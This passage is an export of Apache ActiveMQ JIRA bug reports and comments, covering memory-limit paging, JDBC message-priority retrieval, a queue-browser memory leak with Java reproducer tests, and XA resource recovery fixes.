Consume from q2, you get to page in some messages, brings you possibly > 70%, consume from q3, you get nothing, till q2 or q1 gets some acks.

This is all expected, but with the usage based on %, and varying message size it is very random.;;;","07/Mar/16 16:35;jira-bot;Commit 13ec9949397848c57653845b35e8003f8c490ebd in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=13ec994 ]

Revert ""https://issues.apache.org/jira/browse/AMQ-4495 - revisit. Reinstate check for space on pagein, so that highWaterMark is respected and full state is not reached, hense pfc is not triggered in error""

This reverts commit d8cf54b0a9eee4b86db1ffef2cb3dd1171067307.
;;;","07/Mar/16 17:01;gtully;I have not found a straight forward way to deal with performance issue so I am reverting. Going to tackle the flow control issue on it own.;;;","08/Mar/16 13:49;gtully;On review - i have retained the status quo. The performance implications of going to the store for a batch (page) of messages and dropping them due to no space is too high.

Using a destination limit of X, and a cursorHighWaterMark of 70, only if usage is < 0.7*X will we page in from the store. If we page In, it will be a pageSize and we will accept the full page if a full page of messages exists. This may cause usage to increase past X. However we won't go back to page in till usage is again < 0.7*X.
The 0.7 is the cursorHighWaterMark and X is the memoryUsage (via policy entries). PageSize is also configurable.

If per destinations limits are not set, then the global shared usage is available to all destinations which can lead to starvation of consumers due to the inability to page in because usage > 0.7*X due to messages in memory for other destinations. Their consumers may have dropped off for example.

To divide a shared usage between N destinations:
 0.7*X will be used for caching if the cache is enabled (useCache=true). 
Then be prepared for potential increase of pageSize*messageSize usage when we page in from the store for dispatch. This happens when the cache is exhausted and usage drops below 0.7*X. Ideally, the 0.3*X that remains for pageIn is < pageSize*messageSize. 
For N destinations, the fraction available to each destinations needs to account for the above.
This will ensure that the global shared usage is respected so the JVM heap metrics can be sized sensibly.

Mitigation:
lazyDispatch - where we only page in what can be consumed can help limit the pageSize dynamically if consumers are exact about their prefetch limit or use pull consumers. With 3 pull consumers, we will only pageIn 3 messages if lazyDispatch=true;;;","08/Mar/16 17:30;cshannon;Yes, this is another issue too. The size computation is currently an approximation as you pointed out in that ticket.  Another thing that helped in the queue case with OOM errors was setting the reduceMemoryFootprint flag to true.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-camel component is not a bundle,AMQ-4491,12644821,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,jbonofre,brozow,brozow,26/Apr/13 12:17,24/Sep/13 07:18,14/Jul/23 05:43,24/Sep/13 07:18,5.8.0,,,,,5.9.0,,,Camel,,,,0,,,,,,,,,"When attempting to install the activemq-camel component in karaf it fail to install because the activemq-camel jar here: http://search.maven.org/remotecontent?filepath=org/apache/activemq/activemq-camel/5.8.0/activemq-camel-5.8.0.jar

is not a valid osgi bundle.  It is missing most of the manifest entries in the bundle.",,betzel,brozow,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,325184,,,Tue Sep 24 07:18:19 UTC 2013,,,,,,,,,,,"0|i1k3ov:",325529,,,,,,,,,,,,,,,,,,,,,"24/Sep/13 07:18;davsclaus;Its a bundle now;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JDBCMessageStore fails to retrieve message after 200 messages when cache is disabled,AMQ-4490,12644805,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,metatech,metatech,26/Apr/13 10:05,15/May/13 10:10,14/Jul/23 05:43,15/May/13 10:10,5.5.1,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,"When trying to reproduce bug AMQ-4489, we found that the JDBCMessageStore fails to retrieve all messages from the store when useCache=""false"".

The existing unit test ""JDBCMessagePriorityTest"" reproduces it (see below).
A similar problem occurs when MemoryLimit on the queue is used (which forces the messages to be written to and later read from the JDBC message store).
Can you please have a look ?

-------------------------------------------------------------------------------
Test set: org.apache.activemq.store.jdbc.JDBCMessagePriorityTest
-------------------------------------------------------------------------------
Tests run: 3, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 12.94 sec <<< FAILURE!
testQueues {useCache=false}(org.apache.activemq.store.jdbc.JDBCMessagePriorityTest)  Time elapsed: 6.656 sec  <<< FAILURE!
junit.framework.AssertionFailedError: Message 200 was null
 ",ServiceMix 4.4.2,metatech,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,325168,,,Wed May 15 10:09:41 UTC 2013,,,,,,,,,,,"0|i1k3lj:",325513,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"15/May/13 10:09;metatech;Problem cannot be reproduced on 5.6, closing this ticket.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Newly received messages with higher priority are never consumed, until broker is restarted",AMQ-4489,12644804,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,metatech,metatech,26/Apr/13 09:46,22/Jan/16 22:46,14/Jul/23 05:43,22/Jan/16 22:46,5.5.1,,,,,5.11.0,,,Broker,Message Store,,,0,,,,,,,,,"We configured message prioritization according to the following page :
http://activemq.apache.org/how-can-i-support-priority-queues.html
We use a JDBC adapter for message persistence, in an Oracle database.
Prioritisation is enabled on the queue with the ""prioritizedMessages"" option, and we also specify a memory limit for the queue (24 MB)
We use ActiveMQ 5.5.1 within ServiceMix 4.4.2, and use Camel JMS producers/consumers.
Message can have 2 priorities : 4 (normal) for non-business hours and 9 (high) for business hours.

The scenario to reproduce the problem is the following : 
1. Enqueue 1000 ""normal"" and 1000 ""high"" messages.
2. All ""high"" messages are consumed first.
3. After a few ""normal"" messages are consumed, enqueue additional 1000 ""high"" messages.
4. All ""normal"" messages"" are consumed before ""high"" messages.
5. All additional ""high"" 1000 messages are never consumed.
6. Restart broker.
7. All additional ""high"" 1000 messages start getting consumed.

In production, we have a producer with high peaks during the night (10,000-100,000 messages/hour), and 6 consumers (about 5,000-10,000 messages/hour), so the queue can reach 100,000-200,000 messages at some periods of the day. Messages are small (200 bytes).

We enabled SQL query tracing on the broker (with log4jdbc), and we see that the logic with which the ""findNextMessagesByPriorityStatement"" query is called does not seem correct in the ""JDBCMessageStore.recoverNextMessages"" method :

At step 2, we see the following query being executed :
SELECT ID, MSG FROM ACTIVEMQ_MSGS WHERE CONTAINER='priorityQueue' AND ((ID > 200 AND PRIORITY = 9) OR PRIORITY < 9) ORDER BY PRIORITY DESC, ID

At step 4, we see the following query being executed :
SELECT ID, MSG FROM ACTIVEMQ_MSGS WHERE CONTAINER='priorityQueue' AND ((ID > 1200 AND PRIORITY = 4) OR PRIORITY < 4) ORDER BY PRIORITY DESC, ID

The problem is that the value for the last priority stored in the  ""lastRecoveredPriority"" variable of the JDBCMessageStore stays permanently to 4, until step 6, where it is reset to 9.

We tried changing the priority to constant '9' in the query.  It works OK until step 3, where only 200 messages are consumed

Our understanding is that there should be one ""lastRecoveredSequenceId"" variable for each priority level, so that the last ""consumed message but not yet removed from the DB"" is memorized, and also the priority should probably also be reset to 9 every time the query is executed.

Can you have a look please ?
","ServiceMix 4.4.2, using Camel producers/consumers",gtully,metatech,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5853,,,,,,,,,,,,,"29/Apr/13 09:22;metatech;MessagePriorityTest.java;https://issues.apache.org/jira/secure/attachment/12580955/MessagePriorityTest.java","29/Apr/13 11:55;metatech;MessagePriorityTest_frozen.java;https://issues.apache.org/jira/secure/attachment/12580962/MessagePriorityTest_frozen.java","29/Apr/13 11:10;metatech;MessagePriorityTest_workaround.java;https://issues.apache.org/jira/secure/attachment/12580961/MessagePriorityTest_workaround.java",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,325167,,,Fri Jan 22 22:46:48 UTC 2016,,,,,,,,,,,"0|i1k3lb:",325512,,,,,,,,,,,,,,,,,,,,,"29/Apr/13 09:22;metatech;Problem can be reproduced in ActiveMQ 5.8.0.
Here is a test driver to reproduce it.
Replace the MessagePriorityTest.java in a vanilla installation and run the test :
mvn -Dtest=JDBCMessagePriorityTest test
Note : ""asserts"" have been disabled to avoid stop on first error.;;;","29/Apr/13 11:10;metatech;Here is a new version of the test driver that almost solves the problem of the priorities not taken into account.  The workaround is to  restart the broker before message consumption.  In real-life, this is of course not possible, but it can help find the root cause of the problem.  Instead of hundreds of messages not being prioritized properly, only 2 messages are not, but this minor problem can also be solved with ""queuePrefetch=0"" instead of 1.
Note : the test driver does not reproduce the problem where the messages with high priority are never consumed anymore (this problem could not be isolated).;;;","29/Apr/13 11:55;metatech;A third version (_frozen) of the test driver that reproduces the ""frozen"" consumption of messages.  After 3600 messages, there are still 1200 messages in the queue, but the browser sees ""0"". The workaround to restart the broker resumes the message consumption.;;;","29/Apr/13 20:40;gtully;I just gave org.apache.activemq.store.JDBCMessagePriorityTest#testQueues (with ur modified MessagePriorityTest) a run on trunk and it works, is that the test that should show the problem?
maybe try against at 5.9-SNAPSHOT or did I miss something.;;;","30/Apr/13 08:04;metatech;Gary, thanks for looking into this.
I just tried with the ZIP from Hudson build ActiveMQ-Java7 #187 and the problem is still present.
Beware that the ""asserts"" have been disabled in the test driver, otherwise it is impossible to see how many messages are not sorted according to priority (it aborts on the first failed one).  The easiest way to see it is to change the parameter ""redirectTestOutputToFile"" in the root pom.xml to false, and launch the following command :
mvn -Dtest=JDBCMessagePriorityTest#testQueues test.
;;;","18/Jun/13 12:14;metatech;[~gtully] : Gary, my understanding from this problem is the following : with an ActiveMQ broker configured with JDBC persistence, if the queue depth is larger than what can fit in-memory, any non-FIFO consumer on the queue may be blocked receiving messages in the queue, because messages in the JMS store are only considered for consumption after in-memory messages.  This problem can happen when JMS priorities are used, but also when JMS message selectors are used.
Is that correct ?
;;;","18/Jun/13 12:41;gtully;@metatach I have not had the opportunity to dig deeper into your tests case but for priority, the db gets to order the messages (once it is queried). For selectors, the match only occurs on the cursor. So priority and selectors are different in the jdbc case. It may be that the db is not queried if the cursor gets filled with low priority messages due to the fill order.;;;","22/Jan/16 22:46;tabish;This cases seems to be the same as that in AMQ-5853 which is now resolved.  Tried out the attached tests and it seems they now work as best I can tell.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
java.lang.OutOfMemoryError: Java heap space,AMQ-4487,12644624,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,subathra1985,subathra1985,25/Apr/13 16:16,11/Jul/13 16:24,14/Jul/23 05:43,05/Jun/13 17:35,5.8.0,,,,,5.9.0,,,Broker,,,,2,,,,,,,,,"Hi,

When we browse a queue in webconsole we are getting java.lang.OutOfMemoryError: Java heap space. 
Memory allocation -----> -Xms512m -Xmx3G

When we try to click the queue to view the messages below error is occurring. We recently moved from 5.7 to 5.8 version. We dint face this issue in 5.7 version.

Kindly help in fixing the issue.

java.lang.OutOfMemoryError: Java heap space
        at java.util.Arrays.copyOf(Arrays.java:2882)
        at java.io.CharArrayWriter.write(CharArrayWriter.java:88)
        at java.io.PrintWriter.write(PrintWriter.java:382)
        at com.opensymphony.module.sitemesh.filter.RoutablePrintWriter.write(RoutablePrintWriter.java:144)
        at org.apache.jasper.runtime.JspWriterImpl.flushBuffer(JspWriterImpl.java:181)
        at org.apache.jasper.runtime.JspWriterImpl.write(JspWriterImpl.java:449)
        at org.apache.jasper.runtime.JspWriterImpl.write(JspWriterImpl.java:462)
        at org.apache.jsp.browse_jsp$browse_jspHelper.invoke0(org.apache.jsp.browse_jsp:382)
        at org.apache.jsp.browse_jsp$browse_jspHelper.invoke(org.apache.jsp.browse_jsp:450)
        at org.apache.jsp.tag.web.jms.forEachMessage_tag.doTag(org.apache.jsp.tag.web.jms.forEachMessage_tag:89)
        at org.apache.jsp.browse_jsp._jspx_meth_jms_forEachMessage_0(org.apache.jsp.browse_jsp:170)
        at org.apache.jsp.browse_jsp._jspService(org.apache.jsp.browse_jsp:100)
        at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
        at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)
        at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)
        at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
        at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652)
        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1329)
        at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
        at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)
        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
        at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:102)
        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
        at com.opensymphony.sitemesh.webapp.SiteMeshFilter.obtainContent(SiteMeshFilter.java:129)
        at com.opensymphony.sitemesh.webapp.SiteMeshFilter.doFilter(SiteMeshFilter.java:77)
        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
        at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:445)
        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)


Thank you.

Regards,
Subathra.","OS - Linux 2.6.18-238.el5 #1 SMP Sun Dec 19 14:22:44 EST 2010 x86_64 x86_64 x86_64 GNU/Linux
Activemq - 5.8",ceposta,guim78,ilia_stepanov,jerrinot,jwatkins,richardfearn,subathra1985,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4595,,,,,,,,,,,,AMQ-4372,,,,"03/Jun/13 17:15;tabish;AMQ4487Test.java;https://issues.apache.org/jira/secure/attachment/12585896/AMQ4487Test.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,324989,,,Wed Jun 05 17:35:59 UTC 2013,,,,,,,,,,,"0|i1k2hr:",325334,,,,,,,,,,,,,,,,,,,,,"03/May/13 08:56;subathra1985;Hi, Please provide a fix for this issue.;;;","03/May/13 14:40;jerrinot;Hi Subathra, could you provide a bit more information about the issue? Any idea how many messages is in the queue? What are the conditions to reproduce it?
Thanks!;;;","03/May/13 14:46;subathra1985;Hi Jaromir,

We are not able to browse the queues if the messages are near to 100.

When we click a queue with more than 100 messages in it, we end up in java heap space error.

Thanks,
Subathra.;;;","08/May/13 11:29;subathra1985;Hi; Another thread same problem: https://issues.apache.org/jira/browse/AMQ-4372

;;;","08/May/13 11:32;subathra1985;Has anyone managed to look into this please? We have had to upgrade to active mq 5.8 due to the persistent DB locking problem with lease time with 5.7. After upgrading to 5.8, the DB locking issue was resolved, however, this problem of not being able to browse messages more than 99 in queue is causing a huge problem for us, anyone? Please assist....;;;","08/May/13 12:01;subathra1985;Does not happen on 5.7. Tested on 1.6 and 1.7 JDK.

If you click on 'active consumers' in the console when this is happening, you can see an enormous amount of enqueue and dequeues from the MQ host itself which seems to eat the box.

A few more details on our setup;

ActiveMQ 5.8.0, Running on Java 1.6.x
Backend Storage is Multi-Master Percona 5.5.x
;;;","15/May/13 10:08;subathra1985;Can you please provide us an update on this issue.
;;;","15/May/13 15:31;ceposta;What's the size of your messages?
Have you tried on a 5.9 SNAPSHOT?

;;;","20/May/13 19:18;ilia_stepanov;I have same issue with 5.8.0. I checked the heap dump and debugged the web console, hope this will help to fix it. Please provide an update.

In the heap dump I found an instance of VMPendingMessageCursor holding 18+ millions of PendingNode elements (the queue had actually just two hundreds message). 

I did debugging - the method Queue.iterate() is repeated in an endless loop.

In first run it adds 200 messages to the browser. The second run should normally add no new messages and remove the browserDispatch from the browserDispatches. However this does not happen 
- the if (!node.isAcked() && !browser.getPending().getMessageAudit().isDuplicate(node.getMessageId()))  returns true again and messages are added again. 

The third run adds messages again and so on. Messages are added until OOM occurs.
I found it strange that method ActiveMQMessageAuditNoSync.isDuplicate() returns false in the second iteration and checked it. 

    public boolean isDuplicate(final MessageId id) {
        boolean answer = false;

        if (id != null) {
            ProducerId pid = id.getProducerId();
            if (pid != null) {
                BitArrayBin bab = map.get(pid);  << here the bab is null in the second iteration. why? it should been added in the first iteration
                if (bab == null) {
                    bab = new BitArrayBin(auditDepth);
                    map.put(pid, bab);           << here new entry is added to the map, but the size of keySet() is NOT increased!
                    modified = true;             << here  map.get(pid) returns a coorect value in the debugger. 
						 << However in the next iteration it returns null again...
                }
                answer = bab.setBit(id.getProducerSequenceId(), true);
            }
        }
        return answer;
    }
It looks like a collision in the map. Does ProducerId comes with a proper hashCode() and equals() methods? 

;;;","20/May/13 19:20;tabish;Create a unit test that can reproduce the issue if possible. ;;;","31/May/13 15:20;ilia_stepanov;Hello,
The issue is caused by too high number of different producers (>64). When the number of producers exceeds 64, it is not possible to use QueueBrowser for this queue.

Two problems cause the issue.
1. ActiveMQMessageAuditNoSync has a default max number of producers of 64. (field maximumNumberOfProducersToTrack)
When the actual number of producers exceeds this value, the isDuplicate() does not work anymore correctly and sometimes returns false instead of true. This leads to infinite loop in Queue.iterate method and thus to an out-of-memory situation. 
Ideally Queue.iterate() should recognize that the audit class does not work correctly and fail. For example the ActiveMQMessageAuditNoSync.isDuplicate can throw an exception if map is full.

2. It is not possible to increase the default max value via PolicyEntry. The PolicyEntry's configure() method does not populate MaxProducersToAudit to PrefetchSubscription ( sub.setMaxProducersToAudit(getMaxProducersToAudit()); is missing)
The PrefetchSubscription also does not populate the value to the underlying PendingMessageCursor .
     public void setMaxProducersToAudit(int maxProducersToAudit) {
         this.maxProducersToAudit = maxProducersToAudit;
+        if (pending!=null) {
+               pending.setMaxProducersToAudit(maxProducersToAudit);
+        }
     }

How can I create a unit test for the second issue?

regards,
ilya

;;;","31/May/13 16:26;guim78;Simple reproducer (however, I am not sure it happens every time).
1/ I used default server config, except changing producerFlowControl to false
2/ I used activemq 5.3.2 tool to send 100k messages (used JMX to check number of messages)
java -classpath activemq-all-5.3.2.jar org.apache.activemq.benchmark.Producer tcp://localhost:61616 false TEST.FOO false 1
3/ I used activemq 5.3.2 tool to dequeue messages, still 9k messages in the queue (used JMX to check number of messages)
4/ I used the code below to browse messages - it slowed down over time with the jvm keeping doing full GC
I stopped after 100k iterations, on a queue with 9k messages...

import java.util.Date;
import java.util.Enumeration;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.JMSException;
import javax.jms.Message;
import javax.jms.Queue;
import javax.jms.QueueBrowser;
import javax.jms.Session;

import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ActiveMQQueue;

public class QBrowse {
	ConnectionFactory connectionFactory;
	Connection connection;
	Session session;

	static public void main(String[] parms) throws JMSException {
		QBrowse qb = new QBrowse();
		qb.initCli();
		qb.oldestMsgInQueue(""BENCHMARK.FEED0"");
		qb.endCli();
	}

	public void initCli() throws JMSException {
		connectionFactory = new ActiveMQConnectionFactory(""tcp://localhost:61616"");
		connection = connectionFactory.createConnection();
		connection.start();
		session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
	}

	public void endCli() throws JMSException {
		session.close();
		connection.close();
	}

	
	public void oldestMsgInQueue(String qname) throws JMSException{
		Queue q1= new ActiveMQQueue(qname );
		QueueBrowser br = session.createBrowser(q1,null);
		int iter = 0;
		Enumeration e = br.getEnumeration();
		while(e.hasMoreElements()){
			if((iter % 1000) == 0)
				System.out.println(iter);
			iter = iter+1;
			Message m = (Message) e.nextElement();
		}
		br.close();
		}
}
;;;","31/May/13 16:33;guim78;Please also note that while browsing the queue, cpu went very high mainly comparing a message id with all the message ids from the OrderedPendingList (method org.apache.activemq.broker.region.cursors.OrderedPendingList.contains(..))

I have not read the whole server code, so I may be wrong, still:
- I do not see the relationship between the pending status of a message and the message browsing work
- while not having read all the code in detail (I may be wrong), I got huge performance improvments by rewriting the method:

  public boolean contains(MessageReference message)
  {
    if (message != null)
    	return map.containsKey(message.getMessageId());    	
    return false;
}

(but I still had that infinite loop and memory spike);;;","31/May/13 16:38;tabish;activemq-unit-tests/src/test/java/org.apache.activemq.usecases.QueueBrowsingTest could be a good place to start if you want to try to and help by creating a real JUnit test case. ;;;","03/Jun/13 14:05;ilia_stepanov;Please use following test case to reproduce the problem. The test case illustrates two problems: 
- it is not possible to use Web Console (and QueueBrowser) if a queue contains messages from more then *64* producers. The enumeration gives endless number of messages in the queue which causes out of memory in case of the Web Console.
- it is not possible to increase this threshold of 64 via PolicyEntry (the value does not get propagated properly to ActiveMQMessageAuditNoSync class). Check my comment 31/May/13 16:20 for a possible fix.


package org.apache.activemq.bugs;

import static org.junit.Assert.assertEquals;

import java.net.URI;
import java.util.Enumeration;

import javax.jms.Connection;
import javax.jms.JMSException;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.QueueBrowser;
import javax.jms.Session;

import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.broker.BrokerService;
import org.apache.activemq.broker.TransportConnector;
import org.apache.activemq.broker.region.policy.PolicyEntry;
import org.apache.activemq.broker.region.policy.PolicyMap;
import org.apache.activemq.command.ActiveMQQueue;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author Ilya Stepanov
 */
public class AMQ4487Test {

	private static final Logger LOG = LoggerFactory
			.getLogger(AMQ4487Test.class);

	private BrokerService broker;
	private URI connectUri;
	private ActiveMQConnectionFactory factory;

	@Before
	public void startBroker() throws Exception {
		broker = new BrokerService();
		TransportConnector connector = broker.addConnector(""tcp://0.0.0.0:0"");
		broker.deleteAllMessages();
		broker.start();
		broker.waitUntilStarted();
		connectUri = connector.getConnectUri();
		factory = new ActiveMQConnectionFactory(connectUri);
	}

	@After
	public void stopBroker() throws Exception {
		broker.stop();
		broker.waitUntilStopped();
	}

	@Test
	public void testBrowsing() throws JMSException {

		PolicyEntry policy = new PolicyEntry();
		policy.setQueue("">"");
		policy.setMaxProducersToAudit(400);
		PolicyMap pMap = new PolicyMap();
		pMap.setDefaultEntry(policy);
		broker.setDestinationPolicy(pMap);

		int messageToSend = 370;

		ActiveMQQueue queue = new ActiveMQQueue(""TEST"");
		Connection connection = factory.createConnection();
		connection.start();
		Session session = connection.createSession(false,
				Session.AUTO_ACKNOWLEDGE);

		String data = """";
		for (int i = 0; i < 1024 * 2; i++) {
			data += ""x"";
		}

		for (int i = 0; i < messageToSend; i++) {
			Connection msg_connection = factory.createConnection();
			msg_connection.start();
			Session msg_session = msg_connection.createSession(false,
					Session.AUTO_ACKNOWLEDGE);
			MessageProducer msg_producer = msg_session.createProducer(queue);
			msg_producer.send(msg_session.createTextMessage(data));
		}

		QueueBrowser browser = session.createBrowser(queue);
		Enumeration enumeration = browser.getEnumeration();
		int received = 0;
		while (enumeration.hasMoreElements()) {
			Message m = (Message) enumeration.nextElement();
			received++;
			if (received > messageToSend)
				break;
		}

		browser.close();

		assertEquals(messageToSend, received);
	}

}






;;;","03/Jun/13 17:15;tabish;Expanded the test case a bit, will look into it and get it fixed in v5.9.0;;;","03/Jun/13 21:14;tabish;I've submitted the fix that allows for maxProducersToAudit to be configured which can help to work around the underlying issue.  We will still look for a better solution here though since we can't expect everyone to know how many producers they will have.  ;;;","05/Jun/13 17:35;tabish;Fixed on trunk, use the next v5.9.0 SNAPSHOT to test.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQResourceAdapter.getXARessources() broken,AMQ-4486,12644607,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,25/Apr/13 14:22,11/Jun/20 18:36,14/Jul/23 05:43,23/Jan/14 22:41,5.8.0,,,,,5.10.0,5.9.1,,JCA Container,,,,0,,,,,,,,,"The Implementation of ActiveMQResourceAdapter.getXAResources() is broken.
Its internal call to makeConnection() creates a non-XA ActiveMQConnectionFactory which is then discarded as this ConnectionFactory is not XA-aware. As a result an empty XAResources array is returned.
This causes transaction recovery in the application server to fail.

Where the resource adapter can be manually configured (with beans for example) it is possible to work around by injecting the connection factory as an XA aware variant.",,gtully,jira-bot,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5790,,,,AMQ-7497,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,324972,,,Tue Feb 26 12:28:20 UTC 2019,,,,,,,,,,,"0|i1k2dz:",325317,,,,,,,,,,,,,,,,,,,,,"25/Apr/13 15:53;gtully;fix and test in http://svn.apache.org/r1475798;;;","21/Jan/14 13:58;gtully;leaving connections hanging about till finalize won't cut it with fd limits etc.
need to have a resource wrapper that will open/close a connection for every xa operation.;;;","23/Jan/14 22:41;gtully;fix reworked to open/close around each op - http://git-wip-us.apache.org/repos/asf/activemq/commit/3826a23e;;;","26/Feb/19 12:28;jira-bot;Commit 5bd2abf85dbda14bf41f54d09af4866e814f931f in activemq's branch refs/heads/master from gtully
[ https://gitbox.apache.org/repos/asf?p=activemq.git;h=5bd2abf ]

AMQ-5790 - rework the fix from AMQ-4486 to tie the inbound xaResource connection lifectyle to the rar start/stop
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Skipped message dispatch with concurrent transacted sends at cursor memory limit,AMQ-4485,12644590,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,25/Apr/13 12:31,09/Feb/16 12:54,14/Jul/23 05:43,18/Nov/13 15:32,5.8.0,,,,,5.9.0,,,Broker,,,,0,dispatch,limit,message,missing,order,skipped,usecache,,"With multiple concurrent transacted sends, transaction synchronisation after completions are used to update the cursors.
These happen independent of the order that the store is updated, and hence the store order index.
When the cache is exhausted, a callback to the store to mark the end of caching assumes matching order. If scheduling has swapped the order, it is possible to mark the order index past what is cached and it is possible to skip a dispatch. Alternatively it is possible to mark too early which results in duplicate dispatch if the audit is disabled or exhausted.

The senario that exposed this occurrence used concurrent transacted sends to 100 destinations with slow consumers. Leaving scope for out of order processing and ensuring that the cache is exhausted.

Using a large destination memory limit or systemUsage limit or useCache=false policy entry will avoid this problem. The order is only important when the cache is exhausted.
In the skipped case, the message appears on the queue but is not consumable, however it is consumable after a restart.

